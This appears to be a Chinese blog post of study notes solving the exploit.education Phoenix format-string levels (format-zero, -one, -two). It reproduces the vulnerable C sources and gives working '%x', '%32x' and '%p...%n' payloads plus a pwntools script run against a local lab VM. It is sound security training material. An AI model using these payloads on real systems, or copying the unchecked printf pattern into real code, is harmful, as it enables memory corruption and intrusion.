---
title: "[pwn笔记4]format-zero,format-one,format-two(phoenix)"
urlname: "pwn4"
date: 2023-05-03 17:07:24
tags: [pwn, format]
---
 新的章节讲的是利用格式化字符串漏洞的故事。
 format-two全是x86的题解，找了半天才在一个评论区里找到如何回避x86_64下\x00的坑
## format-zero
### 本题源码

```c
/*
 * phoenix/format-zero, by https://exploit.education
 *
 * Can you change the "changeme" variable?
 *
 * 0 bottles of beer on the wall, 0 bottles of beer! You take one down, and
 * pass it around, 4294967295 bottles of beer on the wall!
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char dest[32];
    volatile int changeme;
  } locals;
  char buffer[16];

  printf("%s\n", BANNER);

  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
    errx(1, "Unable to get buffer");
  }
  buffer[15] = 0;

  locals.changeme = 0;

  sprintf(locals.dest, buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
```

### solve

用15位的格式字符串，产生32位以上的输出，就可以覆盖到changeme。

c的可变参数是存在栈上的，对参数个数没有任何校验。所以我们直接搞一堆数字出来就行了。

```
user@phoenix-amd64:~$ python -c "print('%x'*15)"|/opt/phoenix/amd64/format-zero
Welcome to phoenix/format-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!
```

用gdb看一下内存里格式化出了个什么：

```
(gdb) p (char*)0x00007fffffffe650
$4 = 0x7fffffffe650 "ffffe640f7ffc546712e712ea0a0a0affffe6d8078257825"
```

有48位呢

啊啊啊突然想起可以用"%32x"。。。。（为什么32位够呢，因为输入末尾有个\n）

## format-one

把changeme改成固定的0x45764f6c。只要在上一题的基础上接一个就行。

```
user@phoenix-amd64:~$ python -c "from pwn import *;print('%32x'+p64(0x45764f6c))"|/opt/phoenix/amd64/format-one
Welcome to phoenix/format-one, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed correctly!
```

p64用来把64位整数打包成bytes。

## format-two

### 源码

```c
/*
 * phoenix/format-two, by https://exploit.education
 *
 * Can you change the "changeme" variable?
 *
 * What kind of flower should never be put in a vase?
 * A cauliflower.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int changeme;

void bounce(char *str) {
  printf(str);
}

int main(int argc, char **argv) {
  char buf[256];

  printf("%s\n", BANNER);

  if (argc > 1) {
    memset(buf, 0, sizeof(buf));
    strncpy(buf, argv[1], sizeof(buf));
    bounce(buf);
  }

  if (changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  } else {
    puts("Better luck next time!\n");
  }

  exit(0);
}
```

### 理论

利用%n将已输出的字节数写入某个地址。

由于这里printf没有后面的参数，就可以写入栈里的某个地址。

首先 我们要找到 栈顶 距 我们可以控制的输入 有多远，然后填入%p，一个%p就可以消耗8字节。

此时x86和x86_64的情况有些不同，x86可以像这样（<https://n1ght-w0lf.github.io/binary%20exploitation/format-two/>）

```
/opt/phoenix/i486/format-two $'\x68\x98\x04\x08%x %x %x %x %x %x %x %x %x %x %x %n \n'
```
把要写入的地址（changeme的地址）放在最前面，然后根据计算出的栈顶到字符串的距离写%x。
但是，x64的changeme地址末尾有\x00，还像上面那样搞会被截断，不过我们可以像这样：（<https://blog.lamarranet.com/index.php/exploit-education-phoenix-format-two-solution/>的评论区）

```
/opt/phoenix/amd64/format-two $'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%n\xf0\x0a\x60'
```
每多一个%p字符串增加两字节，但是可以消耗掉栈上的8字节，这就形成了一个追及问题，直到某个数量后，栈上%n下面正好是0x00600af0。
### 坑
bash里拿$(balabala)作为参数时，如果里面有换行，会自动变成两个参数。
### 来点python
```python
from pwn import *

shell = ssh("user", "localhost", password="user", port=2222)
shellcode = b'%p'*15+b'%n\xf0\x0a\x60'

sh = shell.process(argv=["/opt/phoenix/amd64/format-two", shellcode])

sh.interactive()
```